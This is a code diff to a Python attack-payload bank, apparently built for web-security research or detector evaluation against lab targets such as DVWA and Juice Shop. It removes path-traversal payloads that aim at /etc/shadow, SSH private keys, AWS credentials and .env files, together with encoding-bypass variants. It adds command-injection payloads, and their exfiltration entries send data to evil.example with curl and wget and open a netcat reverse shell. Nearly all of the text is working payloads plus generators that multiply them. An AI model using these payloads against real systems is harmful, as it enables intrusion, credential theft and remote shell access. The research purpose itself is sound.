@@ -195,81 +195,6 @@ XSS = {
     ],
 }
 
-PATH_TRAVERSAL = {
-    "recon": [
-        ("shallow_passwd", "../etc/passwd"),
-        ("shallow_config", "../config"),
-        ("shallow_hosts", "../etc/hosts"),
-        ("shallow_index", "../index.php"),
-        ("shallow_env", "../.env"),
-    ],
-    "exploit": [
-        # depth-varied /etc/passwd + neighbours (unix)
-        ("passwd_2", "../../etc/passwd"),
-        ("passwd_3", "../../../etc/passwd"),
-        ("passwd_4", "../../../../etc/passwd"),
-        ("passwd_6", "../../../../../../etc/passwd"),
-        ("passwd_8", "../../../../../../../../etc/passwd"),
-        ("hosts_4", "../../../../etc/hosts"),
-        ("hosts_6", "../../../../../../etc/hosts"),
-        ("etc_issue", "../../../../etc/issue"),
-        ("etc_motd", "../../../../etc/motd"),
-        ("etc_hostname", "../../../../etc/hostname"),
-        ("etc_group", "../../../../etc/group"),
-        ("etc_fstab", "../../../../etc/fstab"),
-        ("proc_environ", "../../../../proc/self/environ"),
-        ("proc_version", "../../../../proc/version"),
-        ("proc_cmdline", "../../../../proc/self/cmdline"),
-        # windows backslash targets
-        ("win_ini_4", r"..\..\..\..\windows\win.ini"),
-        ("win_ini_6", r"..\..\..\..\..\..\windows\win.ini"),
-        ("win_sysini", r"..\..\..\..\windows\system.ini"),
-        ("win_sam", r"..\..\..\..\windows\system32\config\sam"),
-        ("win_hosts", r"..\..\..\..\windows\system32\drivers\etc\hosts"),
-        # absolute paths
-        ("abs_passwd", "/etc/passwd"),
-        ("abs_shadow", "/etc/shadow"),
-        ("abs_hosts", "/etc/hosts"),
-        ("abs_win_ini", r"c:\windows\win.ini"),
-        ("abs_boot_ini", r"c:\boot.ini"),
-        # filter-bypass sequences (no %-encoding -> canonical)
-        ("bypass_dotslash", "....//....//....//etc/passwd"),
-        ("bypass_dotslash_deep", "....//....//....//....//etc/passwd"),
-        ("bypass_nested", "..././..././..././etc/passwd"),
-        ("bypass_mixed", "..\\/..\\/..\\/etc/passwd"),
-        # php / scheme wrappers
-        ("wrap_php_filter", "php://filter/convert.base64-encode/resource=/etc/passwd"),
-        ("wrap_php_filter_index", "php://filter/read=convert.base64-encode/resource=index.php"),
-        ("wrap_file", "file:///etc/passwd"),
-        ("wrap_expect", "expect://id"),
-        ("wrap_data", "data://text/plain,test"),
-        ("wrap_php_input", "php://input"),
-        ("wrap_zip", "zip://shell.zip#payload.php"),
-        ("wrap_phar", "phar://test.phar/x"),
-        # prefix / suffix tricks
-        ("trailing_dot", "../../../../etc/passwd."),
-        ("leading_slash", "/../../../../etc/passwd"),
-        ("dot_prefix", "./../../../../etc/passwd"),
-    ],
-    "exfiltration": [
-        ("shadow", "../../../../../../etc/shadow"),
-        ("dvwa_config", "../../../../../../var/www/html/config/config.inc.php"),
-        ("ssh_root_key", "../../../../../../root/.ssh/id_rsa"),
-        ("ssh_user_key", "../../../../../../home/user/.ssh/id_rsa"),
-        ("aws_creds", "../../../../../../root/.aws/credentials"),
-        ("mysql_history", "../../../../../../root/.mysql_history"),
-        ("bash_history", "../../../../../../root/.bash_history"),
-        ("apache_conf", "../../../../../../etc/apache2/apache2.conf"),
-        ("nginx_conf", "../../../../../../etc/nginx/nginx.conf"),
-        ("shadow_bak", "../../../../../../etc/shadow-"),
-        ("wp_config", "../../../../../../var/www/html/wp-config.php"),
-        ("env_file", "../../../../../../var/www/html/.env"),
-        ("htpasswd", "../../../../../../etc/apache2/.htpasswd"),
-        ("tomcat_users", "../../../../../../opt/tomcat/conf/tomcat-users.xml"),
-        ("ssh_hostkey", "../../../../../../etc/ssh/ssh_host_rsa_key"),
-    ],
-}
-
 # HELD-OUT unknown (open-set). SSTI (Pug/Jade) on Juice Shop = CWE-94.
 # Deliberately kept SMALL and un-expanded to preserve the open-set protocol.
 CODE_INJECTION = {
@@ -288,10 +213,71 @@ CODE_INJECTION = {
     ],
 }
 
+
+COMMAND_INJECTION = {
+    "recon": [
+        ("probe_semicolon", "; id"), ("probe_pipe", "| id"), ("probe_amp", "& id"),
+        ("probe_backtick", "`id`"), ("probe_dollar", "$(id)"),
+        ("probe_or", "|| id"), ("probe_and", "&& id"),
+    ],
+    "exploit": [
+        ("chain_semicolon_ls", "; ls -la"), ("chain_pipe_whoami", "| whoami"),
+        ("chain_amp_hostname", "& hostname"), ("chain_backtick_uname", "`uname -a`"),
+        ("chain_dollar_uname", "$(uname -a)"), ("chain_and_whoami", "&& whoami"),
+        ("chain_or_whoami", "|| whoami"), ("newline_id", "\nid"),
+        ("chain_semicolon_ps", "; ps aux"), ("chain_semicolon_netstat", "; netstat -an"),
+        ("win_amp_dir", "& dir"), ("win_amp_type", "& type C:\\windows\\win.ini"),
+        ("chain_semicolon_ifconfig", "; ifconfig"), ("chain_semicolon_id_bg", "; id #"),
+    ],
+    "exfiltration": [
+        ("exfil_cat_passwd", "; cat /etc/passwd"), ("exfil_cat_shadow", "; cat /etc/shadow"),
+        ("exfil_curl_out", "; curl http://evil.example/$(whoami)"),
+        ("exfil_wget_out", "; wget http://evil.example/$(id)"),
+        ("exfil_nc", "; nc evil.example 4444 -e /bin/sh"),
+        ("exfil_base64_passwd", "; cat /etc/passwd | base64"),
+        ("exfil_env", "; env"), ("exfil_history", "; cat ~/.bash_history"),
+    ],
+}
+
+
+def _gen_cmdi_exploit():
+    out = []
+    seps = ["; ", "| ", "& ", "&& ", "|| ", "\n", "%0a "]
+    cmds = ["id", "whoami", "uname -a", "hostname", "ls -la", "pwd", "cat /etc/passwd",
+            "ps aux", "netstat -an", "ifconfig", "env", "dir",
+            "type C:\\windows\\win.ini", "ping -c 1 127.0.0.1", "curl http://evil.example"]
+    for sep in seps:
+        for cmd in cmds:
+            out.append(("gen_chain", f"{sep}{cmd}"))
+    for pre, post in [("$(", ")"), ("`", "`")]:
+        for cmd in cmds:
+            out.append(("gen_subshell", f"{pre}{cmd}{post}"))
+    return out
+
+
+def _gen_cmdi_exfil():
+    out = []
+    secrets = ["cat /etc/shadow", "cat /etc/passwd", "cat ~/.ssh/id_rsa",
+               "cat ~/.aws/credentials", "cat ~/.bash_history", "env",
+               "cat /etc/apache2/apache2.conf", "cat /etc/nginx/nginx.conf"]
+    net_cmds = ["curl http://evil.example/$(whoami)", "wget http://evil.example/?d=$(id)",
+                "nc evil.example 4444 -e /bin/sh"]
+    for sep in ["; ", "| ", "&& "]:
+        for s in secrets:
+            out.append(("gen_exfil_cat", f"{sep}{s}"))
+        for e in net_cmds:
+            out.append(("gen_exfil_net", f"{sep}{e}"))
+    return out
+
+
+COMMAND_INJECTION["exploit"] += _gen_cmdi_exploit()
+COMMAND_INJECTION["exfiltration"] += _gen_cmdi_exfil()
+
+
 BANKS = {
     "sqli": SQLI,
     "xss": XSS,
-    "path_traversal": PATH_TRAVERSAL,
+    "command_injection": COMMAND_INJECTION,
     "code_injection": CODE_INJECTION,
 }
 
@@ -302,6 +288,11 @@ BANKS = {
 # intentionally carry %-encoding / overlong / null-byte forms (that is their
 # whole point) - so they live HERE, not in the canonical base bank.
 POLYGLOTS = {
+    "command_injection": [
+        "; id; whoami", "| id | whoami", "`id``whoami`", "$(id)$(whoami)",
+        "; id & whoami", "&& id || whoami", "%0a id %0a whoami",
+        "; cat /etc/passwd; id", "| cat /etc/passwd | id",
+    ],
     "sqli": [
         "1' OR '1'='1' UNION SELECT NULL-- -",
         "1'/**/OR/**/1=1#",
@@ -331,21 +322,6 @@ POLYGLOTS = {
         "<svg><script>alert(1)</script>",
         "${alert(1)}{{7*7}}",
         '\'"></script><script>alert(1)</script>',
-    ],
-    "path_traversal": [
-        "..%2f..%5c..%2f..%5cetc/passwd",
-        "....//....//....//etc/passwd",
-        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-        "..%c0%af..%c0%af..%c0%afetc/passwd",
-        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-        "..%2f..%2f..%2f..%2fetc%2fpasswd",
-        "..%252f..%252f..%252fetc%252fpasswd",
-        "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
-        "..%00/etc/passwd",
-        "../../../../etc/passwd%00.png",
-        "..%c1%9c..%c1%9cetc/passwd",
-        "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
-        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow",
     ],
     "code_injection": [
         "#{7*7}${7*7}{{7*7}}",
@@ -502,56 +478,6 @@ def _gen_xss_exfil():
     return out
 
 
-def _gen_pt_exploit():
-    out = []
-    seps = ["../", "..\\", "....//", "..././"]
-    targets = [
-        "etc/passwd", "etc/hosts", "etc/issue", "etc/motd", "etc/hostname",
-        "etc/group", "etc/fstab", "etc/os-release", "etc/resolv.conf",
-        "etc/crontab", "etc/apache2/apache2.conf", "etc/nginx/nginx.conf",
-        "proc/self/environ", "proc/version", "proc/self/cmdline", "proc/self/status",
-        "windows/win.ini", "windows/system.ini",
-        "windows/system32/drivers/etc/hosts", "windows/system32/config/sam",
-        "var/www/html/index.php", "var/www/html/config.php",
-        "var/log/apache2/access.log", "var/log/nginx/access.log",
-        "boot.ini", "usr/local/etc/php.ini", "etc/mysql/my.cnf",
-        "etc/ssh/sshd_config", "etc/sudoers", "etc/passwd-",
-    ]
-    for sep in seps:
-        for depth in range(1, 11):
-            for t in targets:
-                tt = t.replace("/", "\\") if sep == "..\\" else t
-                out.append(("gen_trav", f"{sep * depth}{tt}"))
-    wrappers = [
-        "php://filter/convert.base64-encode/resource=",
-        "php://filter/read=convert.base64-encode/resource=",
-        "file://",
-    ]
-    wtargets = ["/etc/passwd", "index.php", "/etc/hosts", "config.php",
-                "/var/www/html/config/config.inc.php"]
-    for w in wrappers:
-        for wt in wtargets:
-            out.append(("gen_wrap", f"{w}{wt}"))
-    return out
-
-
-def _gen_pt_exfil():
-    out = []
-    prefixes = ["../../../../../../", "/../../../../../../", "../../../../../../../../"]
-    secrets = [
-        "etc/shadow", "root/.ssh/id_rsa", "home/user/.ssh/id_rsa",
-        "root/.aws/credentials", "root/.bash_history", "root/.mysql_history",
-        "var/www/html/config/config.inc.php", "var/www/html/wp-config.php",
-        "var/www/html/.env", "etc/apache2/.htpasswd",
-        "opt/tomcat/conf/tomcat-users.xml", "etc/ssh/ssh_host_rsa_key",
-        "etc/shadow-", "root/.docker/config.json", "root/.kube/config",
-    ]
-    for pre in prefixes:
-        for s in secrets:
-            out.append(("gen_exfil", f"{pre}{s}"))
-    return out
-
-
 def _gen_code_injection():
     recon, exploit, exfil = [], [], []
     wrappers = ["#{%s}", "${%s}", "{{%s}}", "<%%= %s %%>"]
@@ -587,7 +513,7 @@ def _gen_code_injection():
 
 def _gen_polyglots():
     import itertools as _it
-    sqli, xss, pt, ci = [], [], [], []
+    sqli, xss, ci = [], [], []
     closures = ["'", '"', "')", '1"', "-1'"]
     tails = ["-- -", "#", "/**/", ";-- -"]
     for c in closures:
@@ -599,14 +525,10 @@ def _gen_polyglots():
     for b in xbreak:
         for t in xtail:
             xss.append(f"{b}{t}")
-    for depth in range(2, 7):
-        pt.append("..%2f" * depth + "etc/passwd")
-        pt.append("%2e%2e%2f" * depth + "etc%2fpasswd")
-        pt.append("....//" * depth + "etc/passwd")
     ci_bases = ["#{7*7}", "${7*7}", "{{7*7}}", "<%= 7*7 %>", "[[7*7]]"]
     for a, b in _it.combinations(ci_bases, 2):
         ci.append(a + b)
-    return sqli, xss, pt, ci
+    return sqli, xss, ci
 
 
 # --- apply the expansion (BANKS references these same dict objects) ----------
@@ -614,17 +536,14 @@ SQLI["exploit"] += _gen_sqli_exploit()
 SQLI["exfiltration"] += _gen_sqli_exfil()
 XSS["exploit"] += _gen_xss_exploit()
 XSS["exfiltration"] += _gen_xss_exfil()
-PATH_TRAVERSAL["exploit"] += _gen_pt_exploit()
-PATH_TRAVERSAL["exfiltration"] += _gen_pt_exfil()
 _ci_r, _ci_e, _ci_x = _gen_code_injection()
 CODE_INJECTION["recon"] += _ci_r
 CODE_INJECTION["exploit"] += _ci_e
 CODE_INJECTION["exfiltration"] += _ci_x
 
-_pg_s, _pg_x, _pg_p, _pg_c = _gen_polyglots()
+_pg_s, _pg_x, _pg_c = _gen_polyglots()
 POLYGLOTS["sqli"] = list(dict.fromkeys(POLYGLOTS["sqli"] + _pg_s))
 POLYGLOTS["xss"] = list(dict.fromkeys(POLYGLOTS["xss"] + _pg_x))
-POLYGLOTS["path_traversal"] = list(dict.fromkeys(POLYGLOTS["path_traversal"] + _pg_p))
 POLYGLOTS["code_injection"] = list(dict.fromkeys(POLYGLOTS["code_injection"] + _pg_c))
 
 
@@ -648,7 +567,7 @@ def _finalize(bank):
         bank[fam] = out
 
 
-for _bank in (SQLI, XSS, PATH_TRAVERSAL, CODE_INJECTION):
+for _bank in (SQLI, XSS, COMMAND_INJECTION, CODE_INJECTION):
     _finalize(_bank)
 
 
